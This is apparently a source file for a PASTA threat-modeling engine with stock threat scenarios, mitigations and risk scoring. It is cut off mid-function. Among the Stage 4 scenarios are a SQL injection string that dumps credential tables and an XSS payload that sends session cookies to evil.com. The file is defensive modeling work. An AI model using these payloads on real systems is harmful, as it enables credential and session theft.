"""
PASTA Threat Modeling Engine
Process for Attack Simulation and Threat Analysis
A 7-stage, risk-centric threat modeling methodology
"""

from typing import Dict, Any, List, Optional
from enum import Enum
from dataclasses import dataclass, field


class PASTAStage(str, Enum):
    """PASTA's 7 stages"""
    STAGE_1_OBJECTIVES = "Define Objectives"
    STAGE_2_TECHNICAL_SCOPE = "Define Technical Scope"
    STAGE_3_DECOMPOSITION = "Application Decomposition"
    STAGE_4_THREAT_ANALYSIS = "Threat Analysis"
    STAGE_5_VULNERABILITY = "Vulnerability Analysis"
    STAGE_6_ATTACK_MODELING = "Attack Modeling"
    STAGE_7_RISK_ANALYSIS = "Risk & Impact Analysis"


@dataclass
class PASTAObjective:
    """Business objective for PASTA Stage 1"""
    id: str
    description: str
    priority: str  # high, medium, low
    security_requirements: List[str]
    compliance_requirements: List[str]


@dataclass
class PASTATechnicalScope:
    """Technical scope for PASTA Stage 2"""
    components: List[str]
    technologies: List[str]
    data_flows: List[str]
    trust_boundaries: List[str]
    external_dependencies: List[str]


@dataclass
class PASTAThreat:
    """Threat identified in PASTA analysis"""
    id: str
    stage: PASTAStage
    title: str
    description: str
    threat_agent: str
    attack_vector: str
    affected_assets: List[str]
    vulnerabilities: List[str]
    likelihood: float  # 1-5
    impact: float  # 1-5
    risk_score: float
    risk_level: str
    countermeasures: List[str]
    business_impact: str


class PASTAEngine:
    """
    PASTA Threat Modeling Engine.
    
    PASTA (Process for Attack Simulation and Threat Analysis) is a 7-stage
    risk-centric threat modeling methodology that focuses on:
    
    1. Define Objectives - Business objectives and security requirements
    2. Define Technical Scope - Application architecture and data flows
    3. Application Decomposition - Break down the application
    4. Threat Analysis - Identify threats and threat agents
    5. Vulnerability Analysis - Map vulnerabilities to threats
    6. Attack Modeling - Model attack scenarios
    7. Risk & Impact Analysis - Quantify risks and prioritize
    """
    
    # Threat agents commonly considered in PASTA
    THREAT_AGENTS = {
        "external_attacker": {
            "name": "External Attacker",
            "description": "Malicious actor outside the organization",
            "motivation": ["Financial gain", "Espionage", "Hacktivism"],
            "capability": "Varies from script kiddie to nation-state",
            "access": "External network access"
        },
        "insider_threat": {
            "name": "Insider Threat",
            "description": "Malicious or negligent employee/contractor",
            "motivation": ["Financial gain", "Revenge", "Negligence"],
            "capability": "Legitimate access to systems",
            "access": "Internal network and application access"
        },
        "competitor": {
            "name": "Competitor",
            "description": "Business rival seeking competitive advantage",
            "motivation": ["Industrial espionage", "Competitive intelligence"],
            "capability": "Well-resourced, potentially sophisticated",
            "access": "May use social engineering or hired attackers"
        },
        "nation_state": {
            "name": "Nation-State Actor",
            "description": "Government-sponsored threat actor",
            "motivation": ["Espionage", "Sabotage", "Political"],
            "capability": "Highly sophisticated, well-funded",
            "access": "Advanced persistent threats, zero-days"
        },
        "hacktivist": {
            "name": "Hacktivist",
            "description": "Ideologically motivated attacker",
            "motivation": ["Political", "Social", "Environmental causes"],
            "capability": "Varies, often uses known exploits",
            "access": "Publicly accessible attack vectors"
        },
        "organized_crime": {
            "name": "Organized Crime",
            "description": "Criminal organization seeking profit",
            "motivation": ["Financial gain", "Ransomware", "Data theft"],
            "capability": "Well-organized, uses commodity malware",
            "access": "Phishing, exploit kits, purchased access"
        }
    }
    
    # Attack vectors for Stage 6
    ATTACK_VECTORS = {
        "web_application": [
            "SQL Injection",
            "Cross-Site Scripting (XSS)",
            "Cross-Site Request Forgery (CSRF)",
            "Server-Side Request Forgery (SSRF)",
            "Remote Code Execution",
            "Authentication Bypass",
            "Session Hijacking",
            "Directory Traversal"
        ],
        "api": [
            "Broken Object Level Authorization",
            "Broken Authentication",
            "Excessive Data Exposure",
            "Lack of Resources & Rate Limiting",
            "Broken Function Level Authorization",
            "Mass Assignment",
            "Security Misconfiguration",
            "Injection"
        ],
        "network": [
            "Man-in-the-Middle",
            "DNS Poisoning",
            "ARP Spoofing",
            "DDoS Attack",
            "Port Scanning",
            "Network Sniffing"
        ],
        "social_engineering": [
            "Phishing",
            "Spear Phishing",
            "Pretexting",
            "Baiting",
            "Tailgating",
            "Vishing"
        ],
        "supply_chain": [
            "Compromised Dependencies",
            "Malicious Updates",
            "Third-Party Breach",
            "Vendor Compromise"
        ]
    }
    
    # Vulnerability categories
    VULNERABILITY_CATEGORIES = {
        "configuration": "Security misconfiguration vulnerabilities",
        "authentication": "Authentication and session management flaws",
        "authorization": "Access control and authorization issues",
        "input_validation": "Injection and input validation failures",
        "cryptography": "Cryptographic failures and weak encryption",
        "logging": "Insufficient logging and monitoring",
        "data_exposure": "Sensitive data exposure",
        "component": "Vulnerable and outdated components"
    }
    
    # Risk matrix for calculating risk scores
    RISK_MATRIX = {
        (5, 5): ("critical", 25),
        (5, 4): ("critical", 20),
        (4, 5): ("critical", 20),
        (5, 3): ("high", 15),
        (4, 4): ("high", 16),
        (3, 5): ("high", 15),
        (5, 2): ("high", 10),
        (4, 3): ("high", 12),
        (3, 4): ("high", 12),
        (2, 5): ("high", 10),
        (5, 1): ("medium", 5),
        (4, 2): ("medium", 8),
        (3, 3): ("medium", 9),
        (2, 4): ("medium", 8),
        (1, 5): ("medium", 5),
        (4, 1): ("medium", 4),
        (3, 2): ("medium", 6),
        (2, 3): ("medium", 6),
        (1, 4): ("medium", 4),
        (3, 1): ("low", 3),
        (2, 2): ("low", 4),
        (1, 3): ("low", 3),
        (2, 1): ("low", 2),
        (1, 2): ("low", 2),
        (1, 1): ("low", 1),
    }
    
    def __init__(self):
        pass
    
    def analyze(
        self,
        project_data: Dict[str, Any],
        business_objectives: List[str] = None,
        technical_scope: Dict[str, Any] = None
    ) -> Dict[str, Any]:
        """
        Run complete PASTA analysis.
        
        Args:
            project_data: Project metadata and context
            business_objectives: Optional business objectives
            technical_scope: Optional technical scope definition
        
        Returns:
            Complete PASTA analysis results
        """
        results = {
            "methodology": "PASTA",
            "stages": {},
            "threats": [],
            "risk_summary": {}
        }
        
        # Stage 1: Define Objectives
        results["stages"]["stage_1"] = self._stage_1_objectives(
            project_data, business_objectives
        )
        
        # Stage 2: Define Technical Scope
        results["stages"]["stage_2"] = self._stage_2_technical_scope(
            project_data, technical_scope
        )
        
        # Stage 3: Application Decomposition
        results["stages"]["stage_3"] = self._stage_3_decomposition(
            results["stages"]["stage_2"]
        )
        
        # Stage 4: Threat Analysis
        results["stages"]["stage_4"] = self._stage_4_threat_analysis(
            results["stages"]["stage_3"]
        )
        
        # Stage 5: Vulnerability Analysis
        results["stages"]["stage_5"] = self._stage_5_vulnerability_analysis(
            results["stages"]["stage_4"]
        )
        
        # Stage 6: Attack Modeling
        results["stages"]["stage_6"] = self._stage_6_attack_modeling(
            results["stages"]["stage_4"],
            results["stages"]["stage_5"]
        )
        
        # Stage 7: Risk & Impact Analysis
        results["stages"]["stage_7"] = self._stage_7_risk_analysis(
            results["stages"]["stage_6"],
            results["stages"]["stage_1"]
        )
        
        # Compile final threats
        results["threats"] = results["stages"]["stage_7"]["prioritized_threats"]
        results["risk_summary"] = results["stages"]["stage_7"]["summary"]
        
        return results
    
    def _stage_1_objectives(
        self,
        project_data: Dict[str, Any],
        business_objectives: List[str] = None
    ) -> Dict[str, Any]:
        """Stage 1: Define Objectives for Security Analysis"""
        objectives = business_objectives or [
            "Protect customer data confidentiality",
            "Ensure system availability and reliability",
            "Maintain data integrity across transactions",
            "Comply with regulatory requirements",
            "Protect intellectual property"
        ]
        
        return {
            "stage": PASTAStage.STAGE_1_OBJECTIVES.value,
            "business_objectives": objectives,
            "security_requirements": [
                "Authentication and access control",
                "Data encryption at rest and in transit",
                "Audit logging and monitoring",
                "Incident response capability",
                "Secure software development practices"
            ],
            "compliance_frameworks": [
                "NIST 800-53",
                "OWASP ASVS",
                "GDPR",
                "SOC 2"
            ],
            "risk_appetite": "moderate",
            "critical_assets": [
                "Customer PII",
                "Authentication credentials",
                "Financial data",
                "API keys and secrets",
                "Source code"
            ]
        }
    
    def _stage_2_technical_scope(
        self,
        project_data: Dict[str, Any],
        technical_scope: Dict[str, Any] = None
    ) -> Dict[str, Any]:
        """Stage 2: Define Technical Scope"""
        if technical_scope:
            return {
                "stage": PASTAStage.STAGE_2_TECHNICAL_SCOPE.value,
                **technical_scope
            }
        
        return {
            "stage": PASTAStage.STAGE_2_TECHNICAL_SCOPE.value,
            "components": [
                {"id": "web_frontend", "name": "Web Frontend", "type": "presentation"},
                {"id": "api_gateway", "name": "API Gateway", "type": "network"},
                {"id": "auth_service", "name": "Authentication Service", "type": "security"},
                {"id": "core_api", "name": "Core API Service", "type": "business_logic"},
                {"id": "database", "name": "Primary Database", "type": "data_store"},
                {"id": "cache", "name": "Cache Layer", "type": "data_store"},
                {"id": "message_queue", "name": "Message Queue", "type": "integration"}
            ],
            "technologies": [
                "React/Next.js (Frontend)",
                "Python/FastAPI (Backend)",
                "PostgreSQL (Database)",
                "Redis (Cache)",
                "RabbitMQ (Messaging)",
                "Docker/Kubernetes (Infrastructure)"
            ],
            "data_classifications": [
                {"type": "PII", "sensitivity": "high", "examples": ["Names", "Emails", "Addresses"]},
                {"type": "Credentials", "sensitivity": "critical", "examples": ["Passwords", "API Keys"]},
                {"type": "Financial", "sensitivity": "high", "examples": ["Payment info", "Transactions"]},
                {"type": "Application", "sensitivity": "medium", "examples": ["Logs", "Metrics"]}
            ],
            "trust_boundaries": [
                {"id": "tb1", "name": "Internet Boundary", "between": ["users", "web_frontend"]},
                {"id": "tb2", "name": "DMZ Boundary", "between": ["web_frontend", "api_gateway"]},
                {"id": "tb3", "name": "Internal Network", "between": ["api_gateway", "services"]},
                {"id": "tb4", "name": "Data Layer", "between": ["services", "databases"]}
            ],
            "external_dependencies": [
                "Cloud Provider (AWS/GCP/Azure)",
                "CDN Provider",
                "Payment Gateway",
                "Email Service",
                "Third-party APIs"
            ]
        }
    
    def _stage_3_decomposition(
        self,
        technical_scope: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Stage 3: Application Decomposition"""
        components = technical_scope.get("components", [])
        
        # Identify entry points
        entry_points = [
            {"id": "ep1", "name": "Web UI", "type": "user_interface", "exposure": "public"},
            {"id": "ep2", "name": "REST API", "type": "api", "exposure": "public"},
            {"id": "ep3", "name": "Admin Interface", "type": "admin", "exposure": "restricted"},
            {"id": "ep4", "name": "Webhook Endpoints", "type": "integration", "exposure": "public"}
        ]
        
        # Identify data flows
        data_flows = [
            {"from": "user", "to": "web_frontend", "data": "User input", "encrypted": True},
            {"from": "web_frontend", "to": "api_gateway", "data": "API requests", "encrypted": True},
            {"from": "api_gateway", "to": "auth_service", "data": "Auth tokens", "encrypted": True},
            {"from": "api_gateway", "to": "core_api", "data": "Business data", "encrypted": True},
            {"from": "core_api", "to": "database", "data": "Persistent data", "encrypted": True},
            {"from": "core_api", "to": "cache", "data": "Session data", "encrypted": False}
        ]
        
        # Identify assets at each component
        assets = [
            {"component": "auth_service", "assets": ["User credentials", "Session tokens", "OAuth keys"]},
            {"component": "database", "assets": ["Customer PII", "Transaction records", "Audit logs"]},
            {"component": "cache", "assets": ["Session data", "Temporary tokens"]},
            {"component": "core_api", "assets": ["Business logic", "API keys", "Configuration"]}
        ]
        
        return {
            "stage": PASTAStage.STAGE_3_DECOMPOSITION.value,
            "entry_points": entry_points,
            "data_flows": data_flows,
            "assets": assets,
            "privilege_levels": [
                {"level": 0, "name": "Anonymous", "access": "Public endpoints only"},
                {"level": 1, "name": "Authenticated User", "access": "User-specific resources"},
                {"level": 2, "name": "Power User", "access": "Enhanced features"},
                {"level": 3, "name": "Admin", "access": "Administrative functions"},
                {"level": 4, "name": "System", "access": "Full system access"}
            ]
        }
    
    def _stage_4_threat_analysis(
        self,
        decomposition: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Stage 4: Threat Analysis - Identify threats and threat agents"""
        threats = []
        
        # Analyze each entry point for threats
        entry_points = decomposition.get("entry_points", [])
        
        threat_scenarios = [
            {
                "id": "PASTA-T001",
                "title": "Credential Theft via Phishing",
                "threat_agent": "external_attacker",
                "entry_point": "Web UI",
                "attack_vector": "Social engineering leading to credential compromise",
                "affected_assets": ["User credentials", "Session tokens"],
                "motivation": "Account takeover for financial gain",
                "scenario": "An attacker creates a convincing clone of the PadmaVue.ai login page at padmavue-ai.com (typosquatting). They send targeted emails to security analysts claiming 'Your threat model export is ready - click to download'. When victims enter credentials on the fake site, the attacker captures them and immediately uses them to access the real PadmaVue.ai instance, exporting all threat intelligence data before the victim realizes the deception.",
                "specific_mitigations": [
                    "Implement FIDO2/WebAuthn hardware key authentication for all users",
                    "Deploy DMARC, DKIM, and SPF email authentication to prevent domain spoofing",
                    "Enable login anomaly detection alerting on new device/location combinations",
                    "Require MFA via authenticator app (not SMS) for all account access",
                    "Implement phishing-resistant authentication with passkeys"
                ],
                "references": [
                    "[OWASP A07:2021 - Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)",
                    "[CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)",
                    "[MITRE ATT&CK T1566 - Phishing](https://attack.mitre.org/techniques/T1566/)"
                ]
            },
            {
                "id": "PASTA-T002",
                "title": "API Abuse for Data Exfiltration",
                "threat_agent": "insider_threat",
                "entry_point": "REST API",
                "attack_vector": "Excessive API calls to extract bulk data",
                "affected_assets": ["Customer PII", "Business data"],
                "motivation": "Data theft or competitive intelligence",
                "scenario": "A disgruntled employee with valid API credentials writes a Python script that iterates through all project IDs (IDOR vulnerability) calling GET /api/projects/{id}/export. Without rate limiting, they extract 50,000 threat models containing proprietary security analysis in 30 minutes. The data is uploaded to a personal cloud storage before their access is revoked, later appearing on a competitor's platform.",
                "specific_mitigations": [
                    "Implement per-user rate limiting: 100 requests/minute, 1000/hour via Redis-backed limiter",
                    "Add anomaly detection on export endpoints alerting on >10 exports/hour per user",
                    "Require re-authentication (step-up auth) for bulk data export operations",
                    "Implement data loss prevention (DLP) scanning on API responses for PII patterns",
                    "Use UUIDs instead of sequential IDs to prevent enumeration attacks"
                ],
                "references": [
                    "[OWASP API4:2023 - Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)",
                    "[CWE-799: Improper Control of Interaction Frequency](https://cwe.mitre.org/data/definitions/799.html)",
                    "[CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)"
                ]
            },
            {
                "id": "PASTA-T003",
                "title": "SQL Injection Attack",
                "threat_agent": "external_attacker",
                "entry_point": "REST API",
                "attack_vector": "Malicious SQL in input parameters",
                "affected_assets": ["Database", "Customer PII"],
                "motivation": "Data breach, system compromise",
                "scenario": "An attacker discovers the /api/threats/search endpoint accepts a 'query' parameter. They submit `' UNION SELECT username, password_hash, email, api_key, null FROM users--` which bypasses the intended threat search and returns all user credentials. Using the extracted API keys, they authenticate as admin users and modify threat severity scores across all projects to hide critical vulnerabilities from exported reports.",
                "specific_mitigations": [
                    "Use SQLAlchemy ORM with bound parameters exclusively - zero raw SQL queries",
                    "Implement allowlist input validation: search queries must match ^[a-zA-Z0-9\\s\\-_]{1,100}$",
                    "Deploy parameterized stored procedures for complex queries",
                    "Enable PostgreSQL pg_stat_statements to log and detect injection patterns",
                    "Run SQLMap in CI/CD pipeline to detect injection vulnerabilities before deployment"
                ],
                "references": [
                    "[OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)",
                    "[CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)",
                    "[OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)"
                ]
            },
            {
                "id": "PASTA-T004",
                "title": "Session Hijacking",
                "threat_agent": "external_attacker",
                "entry_point": "Web UI",
                "attack_vector": "XSS to steal session tokens",
                "affected_assets": ["Session tokens", "User accounts"],
                "motivation": "Account takeover",
                "scenario": "An attacker discovers that threat descriptions are rendered without sanitization. They create a threat with the description: `<img src=x onerror=\"fetch('https://evil.com/steal?c='+document.cookie)\">`. When an admin views this threat in the review page, the XSS payload executes, sending their session cookie to the attacker's server. The attacker replays the cookie to hijack the admin session and gains full access to all organizational threat models.",
                "specific_mitigations": [
                    "Implement Content-Security-Policy: script-src 'self'; object-src 'none'; base-uri 'self'",
                    "Set HttpOnly and Secure flags on all session cookies (SameSite=Strict)",
                    "Use DOMPurify library to sanitize all user-generated content before rendering",
                    "Implement output encoding using React's built-in JSX escaping (avoid dangerouslySetInnerHTML)",
                    "Deploy Trusted Types API to prevent DOM-based XSS in modern browsers"
                ],
                "references": [
                    "[OWASP A03:2021 - Injection (XSS)](https://owasp.org/Top10/A03_2021-Injection/)",
                    "[CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)",
                    "[OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)"
                ]
            },
            {
                "id": "PASTA-T005",
                "title": "Privilege Escalation",
                "threat_agent": "insider_threat",
                "entry_point": "Admin Interface",
                "attack_vector": "Exploiting authorization flaws",
                "affected_assets": ["System configuration", "All data"],
                "motivation": "Unauthorized access to sensitive functions",
                "scenario": "A standard user notices their JWT contains `{\"role\": \"user\", \"org_id\": \"org_123\"}`. Using jwt.io, they decode and modify the payload to `{\"role\": \"admin\", \"org_id\": \"org_456\"}`. Since the backend uses HS256 with a weak secret ('padmavue_secret_key'), they brute-force the secret and re-sign the token. The modified JWT grants them admin access to a different organization's threat models, allowing them to view competitor security assessments.",
                "specific_mitigations": [
                    "Use RS256 asymmetric JWT signing - private key never leaves the server",
                    "Validate role claims server-side against database on EVERY request",
                    "Implement organization-scoped access control: verify org_id matches user's organization",
                    "Use short-lived access tokens (15 min) with secure refresh token rotation",
                    "Add JWT fingerprinting binding tokens to client TLS certificate or device ID"
                ],
                "references": [
                    "[OWASP A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)",
                    "[CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)",
                    "[CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)"
                ]
            },
            {
                "id": "PASTA-T006",
                "title": "Supply Chain Attack",
                "threat_agent": "nation_state",
                "entry_point": "Dependencies",
                "attack_vector": "Compromised third-party library",
                "affected_assets": ["Source code", "Customer data"],
                "motivation": "Persistent backdoor access",
                "scenario": "A nation-state actor compromises the maintainer account of 'mermaid-parser', a transitive dependency of PadmaVue.ai's diagram generation. They publish version 2.1.1 containing a backdoor that exfiltrates environment variables (including OPENAI_API_KEY and DATABASE_URL) to a C2 server during diagram rendering. The malicious version is automatically pulled during the next `npm install` in CI/CD, and the backdoor persists undetected for 3 months.",
                "specific_mitigations": [
                    "Pin exact dependency versions in package-lock.json and requirements.txt (no ^ or ~)",
                    "Enable GitHub Dependabot alerts and npm audit in CI/CD pipeline with blocking on critical",
                    "Use Socket.dev or Snyk to detect supply chain attacks in real-time",
                    "Implement Software Bill of Materials (SBOM) generation with CycloneDX",
                    "Run dependencies in isolated containers with no network access during build"
                ],
                "references": [
                    "[OWASP A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)",
                    "[CWE-1104: Use of Unmaintained Third Party Components](https://cwe.mitre.org/data/definitions/1104.html)",
                    "[SLSA Framework - Supply Chain Security](https://slsa.dev/)"
                ]
            },
            {
                "id": "PASTA-T007",
                "title": "DDoS Attack",
                "threat_agent": "hacktivist",
                "entry_point": "All public endpoints",
                "attack_vector": "Volumetric and application-layer attacks",
                "affected_assets": ["System availability"],
                "motivation": "Service disruption",
                "scenario": "A hacktivist group targets PadmaVue.ai after the platform is used to analyze their organization's security. They launch a multi-vector attack: 1) Volumetric UDP flood at 50Gbps saturating the network, 2) HTTP GET flood with 100,000 requests/second to /api/analyze, 3) Slowloris attack holding 10,000 connections open. The 4 Uvicorn workers are exhausted, legitimate users receive 503 errors, and the service is down for 6 hours during a critical client demo.",
                "specific_mitigations": [
                    "Deploy behind Cloudflare Pro or AWS Shield Advanced for volumetric DDoS protection",
                    "Implement rate limiting: 100 req/min per IP using FastAPI-Limiter with Redis backend",
                    "Configure nginx with limit_conn_zone and limit_req_zone directives",
                    "Set Uvicorn --limit-concurrency 100 --timeout-keep-alive 5 to prevent Slowloris",
                    "Enable auto-scaling with Kubernetes HPA based on request queue depth"
                ],
                "references": [
                    "[OWASP - Denial of Service](https://owasp.org/www-community/attacks/Denial_of_Service)",
                    "[CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)",
                    "[AWS Shield Best Practices](https://docs.aws.amazon.com/waf/latest/developerguide/ddos-overview.html)"
                ]
            },
            {
                "id": "PASTA-T008",
                "title": "Ransomware Deployment",
                "threat_agent": "organized_crime",
                "entry_point": "Admin Interface",
                "attack_vector": "Phishing + lateral movement",
                "affected_assets": ["All data", "System availability"],
                "motivation": "Financial extortion",
                "scenario": "An organized crime group sends a spear-phishing email to a PadmaVue.ai admin with a malicious PDF attachment. The PDF exploits a zero-day in the preview renderer, installing a RAT. The attackers use the RAT to dump credentials from memory, finding the PostgreSQL admin password. They connect to the database, encrypt all tables with AES-256, delete backups accessible via the compromised credentials, and demand 50 BTC for the decryption key.",
                "specific_mitigations": [
                    "Implement 3-2-1 backup strategy: 3 copies, 2 media types, 1 offsite (immutable S3 with Object Lock)",
                    "Deploy EDR solution (CrowdStrike, SentinelOne) on all admin workstations",
                    "Use separate credentials for backup systems not accessible from production",
                    "Enable PostgreSQL row-level encryption for sensitive threat data",
                    "Implement network segmentation isolating database tier from admin workstations"
                ],
                "references": [
                    "[CISA Ransomware Guide](https://www.cisa.gov/stopransomware)",
                    "[CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)",
                    "[MITRE ATT&CK - Ransomware](https://attack.mitre.org/techniques/T1486/)"
                ]
            }
        ]
        
        return {
            "stage": PASTAStage.STAGE_4_THREAT_ANALYSIS.value,
            "threat_agents": list(self.THREAT_AGENTS.keys()),
            "threat_agent_details": self.THREAT_AGENTS,
            "identified_threats": threat_scenarios,
            "attack_vectors_considered": self.ATTACK_VECTORS
        }
    
    def _stage_5_vulnerability_analysis(
        self,
        threat_analysis: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Stage 5: Vulnerability Analysis"""
        vulnerabilities = [
            {
                "id": "VULN-001",
                "category": "input_validation",
                "title": "Insufficient Input Validation",
                "description": "User inputs not properly sanitized before processing",
                "cwe": "CWE-20",
                "affected_threats": ["PASTA-T003", "PASTA-T004"],
                "exploitability": 4
            },
            {
                "id": "VULN-002",
                "category": "authentication",
                "title": "Weak Session Management",
                "description": "Session tokens lack proper entropy or expiration",
                "cwe": "CWE-384",
                "affected_threats": ["PASTA-T001", "PASTA-T004"],
                "exploitability": 3
            },
            {
                "id": "VULN-003",
                "category": "authorization",
                "title": "Broken Access Control",
                "description": "Inconsistent authorization checks across endpoints",
                "cwe": "CWE-285",
                "affected_threats": ["PASTA-T002", "PASTA-T005"],
                "exploitability": 4
            },
            {
                "id": "VULN-004",
                "category": "configuration",
                "title": "Security Misconfiguration",
                "description": "Default credentials, verbose errors, missing headers",
                "cwe": "CWE-16",
                "affected_threats": ["PASTA-T005", "PASTA-T008"],
                "exploitability": 3
            },
            {
                "id": "VULN-005",
                "category": "component",
                "title": "Vulnerable Dependencies",
                "description": "Outdated libraries with known vulnerabilities",
                "cwe": "CWE-1104",
                "affected_threats": ["PASTA-T006"],
                "exploitability": 4
            },
            {
                "id": "VULN-006",
                "category": "logging",
                "title": "Insufficient Logging",
                "description": "Security events not properly logged or monitored",
                "cwe": "CWE-778",
                "affected_threats": ["PASTA-T001", "PASTA-T002", "PASTA-T005"],
                "exploitability": 2
            }
        ]
        
        return {
            "stage": PASTAStage.STAGE_5_VULNERABILITY.value,
            "vulnerabilities": vulnerabilities,
            "vulnerability_categories": self.VULNERABILITY_CATEGORIES,
            "total_vulnerabilities": len(vulnerabilities),
            "by_category": {
                cat: len([v for v in vulnerabilities if v["category"] == cat])
                for cat in self.VULNERABILITY_CATEGORIES.keys()
            }
        }
    
    def _stage_6_attack_modeling(
        self,
        threat_analysis: Dict[str, Any],
        vulnerability_analysis: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Stage 6: Attack Modeling - Create attack trees and scenarios"""
        threats = threat_analysis.get("identified_threats", [])
        vulnerabilities = vulnerability_analysis.get("vulnerabilities", [])
        
        # Create attack scenarios combining threats and vulnerabilities
        attack_scenarios = []
        
        for threat in threats:
            # Find related vulnerabilities
            related_vulns = [
                v for v in vulnerabilities
                if threat["id"] in v.get("affected_threats", [])
            ]
            
            scenario = {
                "id": f"ATK-{threat['id']}",
                "threat": threat,
                "vulnerabilities_exploited": [v["id"] for v in related_vulns],
                "attack_tree": self._generate_attack_tree(threat, related_vulns),
                "attack_steps": self._generate_attack_steps(threat),
                "success_likelihood": self._calculate_likelihood(threat, related_vulns)
            }
            attack_scenarios.append(scenario)
        
        return {
            "stage": PASTAStage.STAGE_6_ATTACK_MODELING.value,
            "attack_scenarios": attack_scenarios,
            "total_scenarios": len(attack_scenarios),
            "high_likelihood_attacks": [
                s for s in attack_scenarios if s["success_likelihood"] >= 4
            ]
        }
    
    def _stage_7_risk_analysis(
        self,
        attack_modeling: Dict[str, Any],
        objectives: Dict[str, Any]
    ) -> Dict[str, Any]:
        """Stage 7: Risk & Impact Analysis"""
        attack_scenarios = attack_modeling.get("attack_scenarios", [])
        
        prioritized_threats = []
        
        for scenario in attack_scenarios:
            threat = scenario["threat"]
            likelihood = scenario["success_likelihood"]
            
            # Calculate impact based on affected assets
            impact = self._calculate_impact(threat)
            
            # Get risk level from matrix
            risk_key = (int(likelihood), int(impact))
            risk_level, risk_score = self.RISK_MATRIX.get(
                risk_key, ("medium", likelihood * impact)
            )
            
            # Map to severity for compatibility
            severity = "critical" if risk_level == "critical" else \
                      "high" if risk_level == "high" else \
                      "medium" if risk_level == "medium" else "low"
            
            prioritized_threat = {
                "id": threat["id"],
                "category": f"PASTA - {threat.get('threat_agent', 'Unknown')}",
                "title": threat["title"],
                "description": f"{threat.get('attack_vector', '')} by {self.THREAT_AGENTS.get(threat.get('threat_agent', ''), {}).get('name', 'Unknown')}",
                "affected_component": threat.get("entry_point", "System"),
                "attack_vector": threat.get("attack_vector", ""),
                "threat_agent": threat.get("threat_agent", ""),
                "affected_assets": threat.get("affected_assets", []),
                "vulnerabilities": scenario.get("vulnerabilities_exploited", []),
                "dread_score": {
                    "damage": impact * 2,
                    "reproducibility": likelihood * 2,
                    "exploitability": likelihood * 2,
                    "affected_users": impact * 2,
                    "discoverability": 5
                },
                "likelihood": likelihood,
                "impact": impact,
                "overall_risk": risk_score / 2.5,  # Normalize to 1-10 scale
                "risk_level": risk_level,
                "severity": severity,
                "mitigations": self._generate_countermeasures(threat, scenario),
                "business_impact": self._assess_business_impact(threat, objectives),
                "compliance_mappings": {
                    "NIST_800_53": self._map_to_nist(threat),
                    "OWASP_ASVS": self._map_to_asvs(threat)
                },
                # Enhanced fields from scenario-driven schema
                "scenario": threat.get("scenario", ""),
                "specific_mitigations": threat.get("specific_mitigations", []),
                "references": threat.get("references", [])
            }
            
            prioritized_threats.append(prioritized_threat)
        
        # Sort by risk score
        prioritized_threats.sort(key=lambda x: x["overall_risk"], reverse=True)
        
        # Calculate summary
        summary = {
            "total_threats": len(prioritized_threats),
            "by_severity": {
                "critical": len([t for t in prioritized_threats if t["severity"] == "critical"]),
                "high": len([t for t in prioritized_threats if t["severity"] == "high"]),
                "medium": len([t for t in prioritized_threats if t["severity"] == "medium"]),
                "low": len([t for t in prioritized_threats if t["severity"] == "low"])
            },
            "average_risk": sum(t["overall_risk"] for t in prioritized_threats) / len(prioritized_threats) if prioritized_threats else 0,
            "top_threat_agents": list(set(t["threat_agent"] for t in prioritized_threats[:3])),
            "most_affected_assets": self._get_most_affected_assets(prioritized_threats)
        }
        
        return {
            "stage": PASTAStage.STAGE_7_RISK_ANALYSIS.value,
            "prioritized_threats": prioritized_threats,
            "summary": summary,
            "remediation_roadmap": self._generate_remediation_roadmap(prioritized_threats)
        }
    
    def _generate_attack_tree(
        self,
        threat: Dict[str, Any],
        vulnerabilities: List[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """Generate attack tree for a threat"""
        return {
            "goal": threat["title"],
            "sub_goals": [
                {"name": "Gain initial access", "methods": ["Phishing", "Exploit vulnerability"]},
                {"name": "Escalate privileges", "methods": ["Exploit misconfiguration", "Abuse permissions"]},
                {"name": "Achieve objective", "methods": [threat.get("motivation", "Data access")]}
            ],
            "required_vulnerabilities": [v["id"] for v in vulnerabilities]
        }
    
    def _generate_attack_steps(self, threat: Dict[str, Any]) -> List[str]:
        """Generate attack steps for a threat"""
        return [
            f"1. Reconnaissance: Identify {threat.get('entry_point', 'target')}",
            "2. Weaponization: Prepare exploit/payload",
            f"3. Delivery: Execute {threat.get('attack_vector', 'attack')}",
            "4. Exploitation: Gain initial foothold",
            "5. Installation: Establish persistence",
            "6. Command & Control: Maintain access",
            f"7. Actions on Objective: {threat.get('motivation', 'Achieve goal')}"
        ]
    
    def _calculate_likelihood(
        self,
        threat: Dict[str, Any],
        vulnerabilities: List[Dict[str, Any]]
    ) -> float:
        """Calculate attack success likelihood"""
        base = 3.0
        
        # Adjust based on threat agent capability
        agent = threat.get("threat_agent", "")
        if agent in ["nation_state", "organized_crime"]:
            base += 1
        elif agent == "insider_threat":
            base += 0.5
        
        # Adjust based on vulnerability exploitability
        if vulnerabilities:
            avg_exploitability = sum(v.get("exploitability", 3) for v in vulnerabilities) / len(vulnerabilities)
            base = (base + avg_exploitability) / 2
        
